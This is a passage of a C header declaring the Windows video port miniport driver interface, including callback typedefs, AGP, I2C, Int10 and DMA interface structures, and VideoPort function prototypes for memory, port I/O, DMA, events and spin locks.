(NTAPI *PMINIPORT_QUERY_DEVICE_ROUTINE)(
  IN PVOID HwDeviceExtension,
  IN PVOID Context,
  IN VIDEO_DEVICE_DATA_TYPE DeviceDataType,
  IN PVOID Identifier,
  IN ULONG IdentifierLength,
  IN PVOID ConfigurationData,
  IN ULONG ConfigurationDataLength,
  IN OUT PVOID ComponentInformation,
  IN ULONG ComponentInformationLength);

typedef VP_STATUS
(NTAPI *PMINIPORT_GET_REGISTRY_ROUTINE)(
  IN PVOID HwDeviceExtension,
  IN PVOID Context,
  IN OUT PWSTR ValueName,
  IN OUT PVOID ValueData,
  IN ULONG ValueLength);

typedef VOID
(NTAPI *PMINIPORT_DPC_ROUTINE)(
  IN PVOID HwDeviceExtension,
  IN PVOID Context);

typedef BOOLEAN
(NTAPI *PMINIPORT_SYNCHRONIZE_ROUTINE)(
  IN PVOID Context);

typedef VOID
(NTAPI *PVIDEO_BUGCHECK_CALLBACK)(
  IN PVOID HwDeviceExtension,
  IN ULONG BugcheckCode,
  IN PUCHAR Buffer,
  IN ULONG BufferSize);

/* VideoPortSynchronizeExecution.Priority constants */
typedef enum VIDEO_SYNCHRONIZE_PRIORITY {
  VpLowPriority = 0,
  VpMediumPriority,
  VpHighPriority
} VIDEO_SYNCHRONIZE_PRIORITY, *PVIDEO_SYNCHRONIZE_PRIORITY;

/* VideoPortAllocatePool.PoolType constants */
typedef enum _VP_POOL_TYPE {
  VpNonPagedPool = 0,
  VpPagedPool,
  VpNonPagedPoolCacheAligned = 4,
  VpPagedPoolCacheAligned
} VP_POOL_TYPE, *PVP_POOL_TYPE;

typedef enum _DMA_FLAGS {
  VideoPortUnlockAfterDma = 1,
  VideoPortKeepPagesLocked,
  VideoPortDmaInitOnly
} DMA_FLAGS;

typedef struct _VIDEO_HARDWARE_CONFIGURATION_DATA {
  INTERFACE_TYPE InterfaceType;
  ULONG BusNumber;
  USHORT Version;
  USHORT Revision;
  USHORT Irql;
  USHORT Vector;
  ULONG ControlBase;
  ULONG ControlSize;
  ULONG CursorBase;
  ULONG CursorSize;
  ULONG FrameBase;
  ULONG FrameSize;
} VIDEO_HARDWARE_CONFIGURATION_DATA, *PVIDEO_HARDWARE_CONFIGURATION_DATA;

typedef struct _VIDEO_X86_BIOS_ARGUMENTS {
  ULONG Eax;
  ULONG Ebx;
  ULONG Ecx;
  ULONG Edx;
  ULONG Esi;
  ULONG Edi;
  ULONG Ebp;
} VIDEO_X86_BIOS_ARGUMENTS, *PVIDEO_X86_BIOS_ARGUMENTS;

typedef enum VIDEO_DEBUG_LEVEL {
  Error = 0,
  Warn,
  Trace,
  Info
} VIDEO_DEBUG_LEVEL, *PVIDEO_DEBUG_LEVEL;

#ifndef _NTOS_

typedef VP_STATUS
(NTAPI *PDRIVER_IO_PORT_UCHAR)(
  IN ULONG_PTR Context,
  IN ULONG Port,
  IN UCHAR AccessMode,
  IN PUCHAR Data);

typedef VP_STATUS
(NTAPI *PDRIVER_IO_PORT_UCHAR_STRING)(
  IN ULONG_PTR Context,
  IN ULONG Port,
  IN UCHAR AccessMode,
  IN PUCHAR Data,
  IN ULONG DataLength);

typedef VP_STATUS
(NTAPI *PDRIVER_IO_PORT_ULONG)(
  IN ULONG_PTR Context,
  IN ULONG Port,
  IN UCHAR AccessMode,
  IN PULONG Data);

typedef VP_STATUS
(NTAPI *PDRIVER_IO_PORT_ULONG_STRING)(
  IN ULONG_PTR Context,
  IN ULONG Port,
  IN UCHAR AccessMode,
  IN PULONG Data,
  IN ULONG DataLength);

typedef VP_STATUS
(NTAPI *PDRIVER_IO_PORT_USHORT)(
  IN ULONG_PTR Context,
  IN ULONG Port,
  IN UCHAR AccessMode,
  IN PUSHORT Data);

typedef VP_STATUS
(NTAPI *PDRIVER_IO_PORT_USHORT_STRING)(
  IN ULONG_PTR Context,
  IN ULONG Port,
  IN UCHAR AccessMode,
  IN PUSHORT Data,
  IN ULONG DataLength);

#endif /* _NTOS_ */

typedef struct __VRB_SG {
  __int64 PhysicalAddress;
  ULONG Length;
} VRB_SG, *PVRB_SG;

typedef enum _VP_LOCK_OPERATION {
  VpReadAccess = 0,
  VpWriteAccess,
  VpModifyAccess
} VP_LOCK_OPERATION;

typedef struct _VP_DEVICE_DESCRIPTION {
  BOOLEAN ScatterGather;
  BOOLEAN Dma32BitAddresses;
  BOOLEAN Dma64BitAddresses;
  ULONG MaximumLength;
} VP_DEVICE_DESCRIPTION, *PVP_DEVICE_DESCRIPTION;

typedef struct _VIDEO_CHILD_STATE {
  ULONG Id;
  ULONG State;
} VIDEO_CHILD_STATE, *PVIDEO_CHILD_STATE;

typedef struct _VIDEO_CHILD_STATE_CONFIGURATION {
  ULONG Count;
  VIDEO_CHILD_STATE ChildStateArray[ANYSIZE_ARRAY];
} VIDEO_CHILD_STATE_CONFIGURATION, *PVIDEO_CHILD_STATE_CONFIGURATION;

typedef struct _VIDEO_HW_INITIALIZATION_DATA {
  ULONG HwInitDataSize;
  INTERFACE_TYPE AdapterInterfaceType;
  PVIDEO_HW_FIND_ADAPTER HwFindAdapter;
  PVIDEO_HW_INITIALIZE HwInitialize;
  PVIDEO_HW_INTERRUPT HwInterrupt;
  PVIDEO_HW_START_IO HwStartIO;
  ULONG HwDeviceExtensionSize;
  ULONG StartingDeviceNumber;
  PVIDEO_HW_RESET_HW HwResetHw;
  PVIDEO_HW_TIMER HwTimer;
  PVIDEO_HW_START_DMA HwStartDma;
  PVIDEO_HW_POWER_SET HwSetPowerState;
  PVIDEO_HW_POWER_GET HwGetPowerState;
  PVIDEO_HW_GET_CHILD_DESCRIPTOR HwGetVideoChildDescriptor;
  PVIDEO_HW_QUERY_INTERFACE HwQueryInterface;
  ULONG HwChildDeviceExtensionSize;
  PVIDEO_ACCESS_RANGE HwLegacyResourceList;
  ULONG HwLegacyResourceCount;
  PVIDEO_HW_LEGACYRESOURCES HwGetLegacyResources;
  BOOLEAN AllowEarlyEnumeration;
  ULONG Reserved;
} VIDEO_HW_INITIALIZATION_DATA, *PVIDEO_HW_INITIALIZATION_DATA;

typedef struct _I2C_FNC_TABLE {
  IN ULONG Size;
  IN PVIDEO_WRITE_CLOCK_LINE WriteClockLine;
  IN PVIDEO_WRITE_DATA_LINE WriteDataLine;
  IN PVIDEO_READ_CLOCK_LINE ReadClockLine;
  IN PVIDEO_READ_DATA_LINE ReadDataLine;
  IN PVIDEO_WAIT_VSYNC_ACTIVE WaitVsync;
  PVOID Reserved;
} I2C_FNC_TABLE, *PI2C_FNC_TABLE;

typedef struct _DDC_CONTROL {
  IN ULONG Size;
  IN I2C_CALLBACKS I2CCallbacks;
  IN UCHAR EdidSegment;
} DDC_CONTROL, *PDDC_CONTROL;

/* VideoPortQueryServices.ServicesType constants */
typedef enum _VIDEO_PORT_SERVICES {
  VideoPortServicesAGP = 1,
  VideoPortServicesI2C,
  VideoPortServicesHeadless,
  VideoPortServicesInt10,
  VideoPortServicesDebugReport,
  VideoPortServicesWCMemoryProtection
} VIDEO_PORT_SERVICES;

typedef struct _VIDEO_PORT_AGP_INTERFACE {
  SHORT Size;
  SHORT Version;
  PVOID Context;
  PINTERFACE_REFERENCE InterfaceReference;
  PINTERFACE_DEREFERENCE InterfaceDereference;
  PAGP_RESERVE_PHYSICAL AgpReservePhysical;
  PAGP_RELEASE_PHYSICAL AgpReleasePhysical;
  PAGP_COMMIT_PHYSICAL AgpCommitPhysical;
  PAGP_FREE_PHYSICAL AgpFreePhysical;
  PAGP_RESERVE_VIRTUAL AgpReserveVirtual;
  PAGP_RELEASE_VIRTUAL AgpReleaseVirtual;
  PAGP_COMMIT_VIRTUAL AgpCommitVirtual;
  PAGP_FREE_VIRTUAL AgpFreeVirtual;
  ULONGLONG AgpAllocationLimit;
} VIDEO_PORT_AGP_INTERFACE, *PVIDEO_PORT_AGP_INTERFACE;

typedef struct _VIDEO_PORT_AGP_INTERFACE_2 {
  IN USHORT Size;
  IN USHORT Version;
  OUT PVOID Context;
  OUT PINTERFACE_REFERENCE InterfaceReference;
  OUT PINTERFACE_DEREFERENCE InterfaceDereference;
  OUT PAGP_RESERVE_PHYSICAL AgpReservePhysical;
  OUT PAGP_RELEASE_PHYSICAL AgpReleasePhysical;
  OUT PAGP_COMMIT_PHYSICAL AgpCommitPhysical;
  OUT PAGP_FREE_PHYSICAL AgpFreePhysical;
  OUT PAGP_RESERVE_VIRTUAL AgpReserveVirtual;
  OUT PAGP_RELEASE_VIRTUAL AgpReleaseVirtual;
  OUT PAGP_COMMIT_VIRTUAL AgpCommitVirtual;
  OUT PAGP_FREE_VIRTUAL AgpFreeVirtual;
  OUT ULONGLONG AgpAllocationLimit;
  OUT PAGP_SET_RATE AgpSetRate;
} VIDEO_PORT_AGP_INTERFACE_2, *PVIDEO_PORT_AGP_INTERFACE_2;

typedef struct _VIDEO_PORT_I2C_INTERFACE {
  USHORT Size;
  USHORT Version;
  PVOID Context;
  PINTERFACE_REFERENCE InterfaceReference;
  PINTERFACE_DEREFERENCE InterfaceDereference;
  PI2C_START I2CStart;
  PI2C_STOP I2CStop;
  PI2C_WRITE I2CWrite;
  PI2C_READ I2CRead;
} VIDEO_PORT_I2C_INTERFACE, *PVIDEO_PORT_I2C_INTERFACE;

typedef struct _VIDEO_PORT_I2C_INTERFACE_2 {
  IN USHORT Size;
  IN USHORT Version;
  OUT PVOID Context;
  OUT PINTERFACE_REFERENCE InterfaceReference;
  OUT PINTERFACE_DEREFERENCE InterfaceDereference;
  OUT PI2C_START_2 I2CStart;
  OUT PI2C_STOP_2 I2CStop;
  OUT PI2C_WRITE_2 I2CWrite;
  OUT PI2C_READ_2 I2CRead;
} VIDEO_PORT_I2C_INTERFACE_2, *PVIDEO_PORT_I2C_INTERFACE_2;

typedef struct _VIDEO_PORT_INT10_INTERFACE {
  IN USHORT Size;
  IN USHORT Version;
  OUT PVOID Context;
  OUT PINTERFACE_REFERENCE InterfaceReference;
  OUT PINTERFACE_DEREFERENCE InterfaceDereference;
  OUT PINT10_ALLOCATE_BUFFER Int10AllocateBuffer;
  OUT PINT10_FREE_BUFFER Int10FreeBuffer;
  OUT PINT10_READ_MEMORY Int10ReadMemory;
  OUT PINT10_WRITE_MEMORY Int10WriteMemory;
  OUT PINT10_CALL_BIOS Int10CallBios;
} VIDEO_PORT_INT10_INTERFACE, *PVIDEO_PORT_INT10_INTERFACE;

typedef struct _VIDEO_PORT_WCMEMORYPROTECTION_INTERFACE {
  IN USHORT Size;
  IN USHORT Version;
  OUT PVOID Context;
  OUT PINTERFACE_REFERENCE InterfaceReference;
  OUT PINTERFACE_DEREFERENCE InterfaceDereference;
  OUT PROTECT_WC_MEMORY VideoPortProtectWCMemory;
  OUT RESTORE_WC_MEMORY VideoPortRestoreWCMemory;
} VIDEO_PORT_WCMEMORYPROTECTION_INTERFACE, *PVIDEO_PORT_WCMEMORYPROTECTION_INTERFACE;

typedef struct _VPOSVERSIONINFO {
  IN ULONG Size;
  OUT ULONG MajorVersion;
  OUT ULONG MinorVersion;
  OUT ULONG BuildNumber;
  OUT USHORT ServicePackMajor;
  OUT USHORT ServicePackMinor;
} VPOSVERSIONINFO, *PVPOSVERSIONINFO;

typedef struct _VIDEO_PORT_DEBUG_REPORT_INTERFACE {
  IN USHORT Size;
  IN USHORT Version;
  OUT PVOID Context;
  OUT PINTERFACE_REFERENCE InterfaceReference;
  OUT PINTERFACE_DEREFERENCE InterfaceDereference;
  OUT PVIDEO_DEBUG_REPORT (*DbgReportCreate)(
    IN PVOID HwDeviceExtension,
    IN ULONG ulCode,
    IN ULONG_PTR ulpArg1,
    IN ULONG_PTR ulpArg2,
    IN ULONG_PTR ulpArg3,
    IN ULONG_PTR ulpArg4
  );
  OUT BOOLEAN (*DbgReportSecondaryData)(
    IN OUT PVIDEO_DEBUG_REPORT pReport,
    IN PVOID pvData,
    IN ULONG ulDataSize
  );
  OUT VOID (*DbgReportComplete)(
    IN OUT PVIDEO_DEBUG_REPORT pReport
  );
} VIDEO_PORT_DEBUG_REPORT_INTERFACE, *PVIDEO_PORT_DEBUG_REPORT_INTERFACE;

/* Video port functions for miniports */

VPAPI
VP_STATUS
NTAPI
VideoPortAllocateBuffer(
  IN PVOID HwDeviceExtension,
  IN ULONG Size,
  OUT PVOID *Buffer);

VPAPI
VOID
NTAPI
VideoPortAcquireDeviceLock(
  IN PVOID HwDeviceExtension);

VPAPI
ULONG
NTAPI
VideoPortCompareMemory(
  IN PVOID Source1,
  IN PVOID Source2,
  IN SIZE_T Length);

VPAPI
BOOLEAN
NTAPI
VideoPortDDCMonitorHelper(
  IN PVOID HwDeviceExtension,
  IN PVOID DDCControl,
  IN OUT PUCHAR EdidBuffer,
  IN ULONG EdidBufferSize);

VPAPI
VOID
__cdecl
VideoPortDebugPrint(
  IN VIDEO_DEBUG_LEVEL DebugPrintLevel,
  IN PSTR DebugMessage,
  IN ...);

VPAPI
VP_STATUS
NTAPI
VideoPortDisableInterrupt(
  IN PVOID HwDeviceExtension);

VPAPI
VP_STATUS
NTAPI
VideoPortEnableInterrupt(
  IN PVOID HwDeviceExtension);

VPAPI
VP_STATUS
NTAPI
VideoPortEnumerateChildren(
  IN PVOID HwDeviceExtension,
  IN PVOID Reserved);

VPAPI
VOID
NTAPI
VideoPortFreeDeviceBase(
  IN PVOID HwDeviceExtension,
  IN PVOID MappedAddress);

VPAPI
VP_STATUS
NTAPI
VideoPortGetAccessRanges(
  IN PVOID HwDeviceExtension,
  IN ULONG NumRequestedResources,
  IN PIO_RESOURCE_DESCRIPTOR RequestedResources OPTIONAL,
  IN ULONG NumAccessRanges,
  OUT PVIDEO_ACCESS_RANGE AccessRanges,
  IN PVOID VendorId,
  IN PVOID DeviceId,
  OUT PULONG Slot);

VPAPI
PVOID
NTAPI
VideoPortGetAssociatedDeviceExtension(
  IN PVOID DeviceObject);

VPAPI
ULONG
NTAPI
VideoPortGetBusData(
  IN PVOID HwDeviceExtension,
  IN BUS_DATA_TYPE BusDataType,
  IN ULONG SlotNumber,
  IN OUT PVOID Buffer,
  IN ULONG Offset,
  IN ULONG Length);

VPAPI
UCHAR
NTAPI
VideoPortGetCurrentIrql(VOID);

VPAPI
PVOID
NTAPI
VideoPortGetDeviceBase(
  IN PVOID HwDeviceExtension,
  IN PHYSICAL_ADDRESS IoAddress,
  IN ULONG NumberOfUchars,
  IN UCHAR InIoSpace);

VPAPI
VP_STATUS
NTAPI
VideoPortGetDeviceData(
  IN PVOID HwDeviceExtension,
  IN VIDEO_DEVICE_DATA_TYPE DeviceDataType,
  IN PMINIPORT_QUERY_DEVICE_ROUTINE CallbackRoutine,
  IN PVOID Context);

VPAPI
VP_STATUS
NTAPI
VideoPortGetRegistryParameters(
  IN PVOID HwDeviceExtension,
  IN PWSTR ParameterName,
  IN UCHAR IsParameterFileName,
  IN PMINIPORT_GET_REGISTRY_ROUTINE CallbackRoutine,
  IN PVOID Context);

VPAPI
PVOID
NTAPI
VideoPortGetRomImage(
  IN PVOID HwDeviceExtension,
  IN PVOID Unused1,
  IN ULONG Unused2,
  IN ULONG Length);

VPAPI
VP_STATUS
NTAPI
VideoPortGetVgaStatus(
  IN PVOID HwDeviceExtension,
  OUT PULONG VgaStatus);

VPAPI
LONG
FASTCALL
VideoPortInterlockedDecrement(
  IN PLONG Addend);

VPAPI
LONG
FASTCALL
VideoPortInterlockedExchange(
  IN OUT PLONG Target,
  IN LONG Value);

VPAPI
LONG
FASTCALL
VideoPortInterlockedIncrement(
  IN PLONG Addend);

VPAPI
ULONG
NTAPI
VideoPortInitialize(
  IN PVOID Argument1,
  IN PVOID Argument2,
  IN PVIDEO_HW_INITIALIZATION_DATA HwInitializationData,
  IN PVOID HwContext);

VPAPI
VP_STATUS
NTAPI
VideoPortInt10(
  IN PVOID HwDeviceExtension,
  IN PVIDEO_X86_BIOS_ARGUMENTS BiosArguments);

VPAPI
VOID
NTAPI
VideoPortLogError(
  IN PVOID HwDeviceExtension,
  IN PVIDEO_REQUEST_PACKET Vrp OPTIONAL,
  IN VP_STATUS ErrorCode,
  IN ULONG UniqueId);

VPAPI
VP_STATUS
NTAPI
VideoPortMapBankedMemory(
  IN PVOID HwDeviceExtension,
  IN PHYSICAL_ADDRESS PhysicalAddress,
  IN OUT PULONG Length,
  PULONG InIoSpace,
  PVOID *VirtualAddress,
  ULONG BankLength,
  UCHAR ReadWriteBank,
  PBANKED_SECTION_ROUTINE BankRoutine,
  PVOID Context);

VPAPI
VP_STATUS
NTAPI
VideoPortMapMemory(
  IN PVOID HwDeviceExtension,
  IN PHYSICAL_ADDRESS PhysicalAddress,
  IN OUT PULONG Length,
  IN PULONG InIoSpace,
  IN OUT PVOID *VirtualAddress);

VPAPI
VOID
NTAPI
VideoPortMoveMemory(
  IN PVOID Destination,
  IN PVOID Source,
  IN ULONG Length);

VPAPI
LONGLONG
NTAPI
VideoPortQueryPerformanceCounter(
  IN PVOID HwDeviceExtension,
  OUT PLONGLONG PerformanceFrequency OPTIONAL);

VPAPI
VP_STATUS
NTAPI
VideoPortQueryServices(
  IN PVOID HwDeviceExtension,
  IN VIDEO_PORT_SERVICES ServicesType,
  IN OUT PINTERFACE Interface);

VPAPI
BOOLEAN
NTAPI
VideoPortQueueDpc(
  IN PVOID HwDeviceExtension,
  IN PMINIPORT_DPC_ROUTINE CallbackRoutine,
  IN PVOID Context);

VPAPI
VOID
NTAPI
VideoPortReadPortBufferUchar(
  IN PUCHAR Port,
  OUT PUCHAR Buffer,
  IN ULONG Count);

VPAPI
VOID
NTAPI
VideoPortReadPortBufferUlong(
  IN PULONG Port,
  OUT PULONG Buffer,
  IN ULONG Count);

VPAPI
VOID
NTAPI
VideoPortReadPortBufferUshort(
  IN PUSHORT Port,
  OUT PUSHORT Buffer,
  IN ULONG Count);

VPAPI
UCHAR
NTAPI
VideoPortReadPortUchar(
  IN PUCHAR Port);

VPAPI
ULONG
NTAPI
VideoPortReadPortUlong(
  IN PULONG Port);

VPAPI
USHORT
NTAPI
VideoPortReadPortUshort(
  IN PUSHORT Port);

VPAPI
VOID
NTAPI
VideoPortReadRegisterBufferUchar(
  IN PUCHAR Register,
  OUT PUCHAR Buffer,
  IN ULONG Count);

VPAPI
VOID
NTAPI
VideoPortReadRegisterBufferUlong(
  IN PULONG Register,
  OUT PULONG Buffer,
  IN ULONG Count);

VPAPI
VOID
NTAPI
VideoPortReadRegisterBufferUshort(
  IN PUSHORT Register,
  OUT PUSHORT Buffer,
  IN ULONG Count);

VPAPI
UCHAR
NTAPI
VideoPortReadRegisterUchar(
  IN PUCHAR Register);

VPAPI
ULONG
NTAPI
VideoPortReadRegisterUlong(
  IN PULONG Register);

VPAPI
USHORT
NTAPI
VideoPortReadRegisterUshort(
  IN PUSHORT Register);

VPAPI
VOID
NTAPI
VideoPortReleaseBuffer(
  IN PVOID HwDeviceExtension,
  IN PVOID Buffer);

VPAPI
VOID
NTAPI
VideoPortReleaseDeviceLock(
  IN PVOID HwDeviceExtension);

VPAPI
BOOLEAN
NTAPI
VideoPortScanRom(
  PVOID HwDeviceExtension,
  PUCHAR RomBase,
  ULONG RomLength,
  PUCHAR String);

VPAPI
ULONG
NTAPI
VideoPortSetBusData(
  IN PVOID HwDeviceExtension,
  IN BUS_DATA_TYPE BusDataType,
  IN ULONG SlotNumber,
  IN PVOID Buffer,
  IN ULONG Offset,
  IN ULONG Length);

VPAPI
VP_STATUS
NTAPI
VideoPortSetRegistryParameters(
  IN PVOID HwDeviceExtension,
  IN PWSTR ValueName,
  IN PVOID ValueData,
  IN ULONG ValueLength);

VPAPI
VP_STATUS
NTAPI
VideoPortSetTrappedEmulatorPorts(
  IN PVOID HwDeviceExtension,
  IN ULONG NumAccessRanges,
  IN PVIDEO_ACCESS_RANGE AccessRange);

VPAPI
VOID
NTAPI
VideoPortStallExecution(
  IN ULONG Microseconds);

VPAPI
VOID
NTAPI
VideoPortStartTimer(
  IN PVOID HwDeviceExtension);

VPAPI
VOID
NTAPI
VideoPortStopTimer(
  IN PVOID HwDeviceExtension);

VPAPI
BOOLEAN
NTAPI
VideoPortSynchronizeExecution(
  IN PVOID HwDeviceExtension,
  IN VIDEO_SYNCHRONIZE_PRIORITY Priority,
  IN PMINIPORT_SYNCHRONIZE_ROUTINE SynchronizeRoutine,
  IN PVOID Context);

VPAPI
VP_STATUS
NTAPI
VideoPortUnmapMemory(
  IN PVOID HwDeviceExtension,
  IN OUT PVOID VirtualAddress,
  IN HANDLE ProcessHandle);

VPAPI
VP_STATUS
NTAPI
VideoPortVerifyAccessRanges(
  IN PVOID HwDeviceExtension,
  IN ULONG NumAccessRanges,
  IN PVIDEO_ACCESS_RANGE AccessRanges);

VPAPI
VOID
NTAPI
VideoPortWritePortBufferUchar(
  IN PUCHAR Port,
  IN PUCHAR Buffer,
  IN ULONG Count);

VPAPI
VOID
NTAPI
VideoPortWritePortBufferUlong(
  IN PULONG Port,
  IN PULONG Buffer,
  IN ULONG Count);

VPAPI
VOID
NTAPI
VideoPortWritePortBufferUshort(
  IN PUSHORT Port,
  IN PUSHORT Buffer,
  IN ULONG Count);

VPAPI
VOID
NTAPI
VideoPortWritePortUchar(
  IN PUCHAR Port,
  IN UCHAR Value);

VPAPI
VOID
NTAPI
VideoPortWritePortUlong(
  IN PULONG Port,
  IN ULONG Value);

VPAPI
VOID
NTAPI
VideoPortWritePortUshort(
  IN PUSHORT Port,
  IN USHORT Value);

VPAPI
VOID
NTAPI
VideoPortWriteRegisterBufferUchar(
  IN PUCHAR Register,
  IN PUCHAR Buffer,
  IN ULONG Count);

VPAPI
VOID
NTAPI
VideoPortWriteRegisterBufferUlong(
  IN PULONG Register,
  IN PULONG Buffer,
  IN ULONG Count);

VPAPI
VOID
NTAPI
VideoPortWriteRegisterBufferUshort(
  IN PUSHORT Register,
  IN PUSHORT Buffer,
  IN ULONG Count);

VPAPI
VOID
NTAPI
VideoPortWriteRegisterUchar(
  IN PUCHAR Register,
  IN UCHAR Value);

VPAPI
VOID
NTAPI
VideoPortWriteRegisterUlong(
  IN PULONG Register,
  IN ULONG Value);

VPAPI
VOID
NTAPI
VideoPortWriteRegisterUshort(
  IN PUSHORT Register,
  IN USHORT Value);

VPAPI
VOID
NTAPI
VideoPortZeroDeviceMemory(
  IN PVOID Destination,
  IN ULONG Length);

VPAPI
VOID
NTAPI
VideoPortZeroMemory(
  IN PVOID Destination,
  IN ULONG Length);

VPAPI
PVOID
NTAPI
VideoPortAllocateContiguousMemory(
  IN PVOID HwDeviceExtension,
  IN ULONG NumberOfBytes,
  IN PHYSICAL_ADDRESS HighestAcceptableAddress);

VPAPI
PVOID
NTAPI
VideoPortGetCommonBuffer(
  IN PVOID HwDeviceExtension,
  IN ULONG DesiredLength,
  IN ULONG Alignment,
  OUT PPHYSICAL_ADDRESS LogicalAddress,
  OUT PULONG pActualLength,
  IN BOOLEAN CacheEnabled);

VPAPI
VOID
NTAPI
VideoPortFreeCommonBuffer(
  IN PVOID HwDeviceExtension,
  IN ULONG Length,
  IN PVOID VirtualAddress,
  IN PHYSICAL_ADDRESS LogicalAddress,
  IN BOOLEAN CacheEnabled);

VPAPI
PDMA
NTAPI
VideoPortDoDma(
  IN PVOID HwDeviceExtension,
  IN PDMA pDma,
  IN DMA_FLAGS DmaFlags);

VPAPI
BOOLEAN
NTAPI
VideoPortLockPages(
  IN PVOID HwDeviceExtension,
  IN OUT PVIDEO_REQUEST_PACKET pVrp,
  IN OUT PEVENT pUEvent,
  IN PEVENT pDisplayEvent,
  IN DMA_FLAGS DmaFlags);

VPAPI
BOOLEAN
NTAPI
VideoPortUnlockPages(
  IN PVOID hwDeviceExtension,
  IN OUT PDMA pDma);

VPAPI
BOOLEAN
NTAPI
VideoPortSignalDmaComplete(
  IN PVOID HwDeviceExtension,
  IN PDMA pDmaHandle);

VPAPI
PVOID
NTAPI
VideoPortGetMdl(
  IN PVOID HwDeviceExtension,
  IN PDMA pDma);

VPAPI
PVOID
NTAPI
VideoPortGetDmaContext(
  IN PVOID HwDeviceExtension,
  IN PDMA pDma);

VPAPI
VOID
NTAPI
VideoPortSetDmaContext(
  IN PVOID HwDeviceExtension,
  OUT PDMA pDma,
  IN PVOID InstanceContext);

VPAPI
ULONG
NTAPI
VideoPortGetBytesUsed(
  IN PVOID HwDeviceExtension,
  IN PDMA pDma);

VPAPI
VOID
NTAPI
VideoPortSetBytesUsed(
  IN PVOID HwDeviceExtension,
  IN OUT PDMA pDma,
  IN ULONG BytesUsed);

VPAPI
PDMA
NTAPI
VideoPortAssociateEventsWithDmaHandle(
  IN PVOID HwDeviceExtension,
  IN OUT PVIDEO_REQUEST_PACKET pVrp,
  IN PVOID MappedUserEvent,
  IN PVOID DisplayDriverEvent);

VPAPI
PDMA
NTAPI
VideoPortMapDmaMemory(
  IN PVOID HwDeviceExtension,
  IN PVIDEO_REQUEST_PACKET pVrp,
  IN PHYSICAL_ADDRESS BoardAddress,
  IN PULONG Length,
  IN PULONG InIoSpace,
  IN PVOID MappedUserEvent,
  IN PVOID DisplayDriverEvent,
  IN OUT PVOID *VirtualAddress);

VPAPI
BOOLEAN
NTAPI
VideoPortUnmapDmaMemory(
  IN PVOID HwDeviceExtension,
  IN PVOID VirtualAddress,
  IN HANDLE ProcessHandle,
  IN PDMA BoardMemoryHandle);

VPAPI
VP_STATUS
NTAPI
VideoPortCreateSecondaryDisplay(
  IN PVOID HwDeviceExtension,
  IN OUT PVOID *SecondaryDeviceExtension,
  IN ULONG ulFlag);

VPAPI
PVP_DMA_ADAPTER
NTAPI
VideoPortGetDmaAdapter(
  IN PVOID HwDeviceExtension,
  IN PVP_DEVICE_DESCRIPTION VpDeviceDescription);

VPAPI
VOID
NTAPI
VideoPortPutDmaAdapter(
  IN PVOID HwDeviceExtension,
  IN PVP_DMA_ADAPTER VpDmaAdapter);

VPAPI
PVOID
NTAPI
VideoPortAllocateCommonBuffer(
  IN PVOID HwDeviceExtension,
  IN PVP_DMA_ADAPTER VpDmaAdapter,
  IN ULONG DesiredLength,
  OUT PPHYSICAL_ADDRESS LogicalAddress,
  IN BOOLEAN CacheEnabled,
  PVOID Reserved);

VPAPI
VOID
NTAPI
VideoPortReleaseCommonBuffer(
  IN PVOID HwDeviceExtension,
  IN PVP_DMA_ADAPTER VpDmaAdapter,
  IN ULONG Length,
  IN PHYSICAL_ADDRESS LogicalAddress,
  IN PVOID VirtualAddress,
  IN BOOLEAN CacheEnabled);

VPAPI
PVOID
NTAPI
VideoPortLockBuffer(
  IN PVOID HwDeviceExtension,
  IN PVOID BaseAddress,
  IN ULONG Length,
  IN VP_LOCK_OPERATION Operation);

VPAPI
VOID
NTAPI
VideoPortUnLockBuffer(
  IN PVOID HwDeviceExtension,
  IN PVOID Mdl);

VPAPI
VP_STATUS
NTAPI
VideoPortStartDma(
  IN PVOID HwDeviceExtension,
  IN PVP_DMA_ADAPTER VpDmaAdapter,
  IN PVOID Mdl,
  IN ULONG Offset,
  IN OUT PULONG pLength,
  IN PEXECUTE_DMA ExecuteDmaRoutine,
  IN PVOID Context,
  IN BOOLEAN WriteToDevice);

VPAPI
VP_STATUS
NTAPI
VideoPortCompleteDma(
  IN PVOID HwDeviceExtension,
  IN PVP_DMA_ADAPTER VpDmaAdapter,
  IN PVP_SCATTER_GATHER_LIST VpScatterGather,
  IN BOOLEAN WriteToDevice);

VPAPI
VP_STATUS
NTAPI
VideoPortCreateEvent(
  IN PVOID HwDeviceExtension,
  IN ULONG EventFlag,
  IN PVOID Unused,
  OUT PEVENT *ppEvent);

VPAPI
VP_STATUS
NTAPI
VideoPortDeleteEvent(
  IN PVOID HwDeviceExtension,
  IN PEVENT pEvent);

VPAPI
LONG
NTAPI
VideoPortSetEvent(
  IN PVOID HwDeviceExtension,
  IN PEVENT pEvent);

VPAPI
VOID
NTAPI
VideoPortClearEvent(
  IN PVOID HwDeviceExtension,
  IN PEVENT pEvent);

VPAPI
LONG
NTAPI
VideoPortReadStateEvent(
  IN PVOID HwDeviceExtension,
  IN PEVENT pEvent);

VPAPI
VP_STATUS
NTAPI
VideoPortWaitForSingleObject(
  IN PVOID HwDeviceExtension,
  IN PVOID Object,
  IN PLARGE_INTEGER Timeout OPTIONAL);

VPAPI
PVOID
NTAPI
VideoPortAllocatePool(
  IN PVOID HwDeviceExtension,
  IN VP_POOL_TYPE PoolType,
  IN SIZE_T NumberOfBytes,
  IN ULONG Tag);

VPAPI
VOID
NTAPI
VideoPortFreePool(
  IN PVOID HwDeviceExtension,
  IN PVOID Ptr);

VPAPI
VP_STATUS
NTAPI
VideoPortCreateSpinLock(
  IN PVOID HwDeviceExtension,
  OUT PSPIN_LOCK *SpinLock);

VPAPI
VP_STATUS
NTAPI
VideoPortDeleteSpinLock(
  IN PVOID HwDeviceExtension,
  IN PSPIN_LOCK SpinLock);

VPAPI
VOID
NTAPI
VideoPortAcquireSpinLock(
  IN PVOID HwDeviceExtension,
  IN PSPIN_LOCK SpinLock,
  OUT PUCHAR OldIrql);

VPAPI
VOID
NTAPI
VideoPortAcquireSpinLockAtDpcLevel(
  IN PVOID HwDeviceExtension,
  IN PSPIN_LOCK SpinLock);

VPAPI
VOID
NTAPI
VideoPortReleaseSpinLock(
  IN PVOID HwDeviceExtension,
  IN PSPIN_LOCK SpinLock,
  IN UCHAR NewIrql);

VPAPI
VOID
NTAPI
VideoPortReleaseSpinLockFromDpcLevel(
  IN PVOID HwDeviceExtension,
  IN PSPIN_LOCK SpinLock);

VPAPI
VOID
NTAPI
VideoPortQuerySystemTime(
  OUT PLARGE_INTEGER CurrentTime);

VPAPI
BOOLEAN
NTAPI
VideoPortCheckForDeviceExistence(
  IN PVOID HwDeviceExtension,
  IN USHORT VendorId,
  IN USHORT DeviceId,
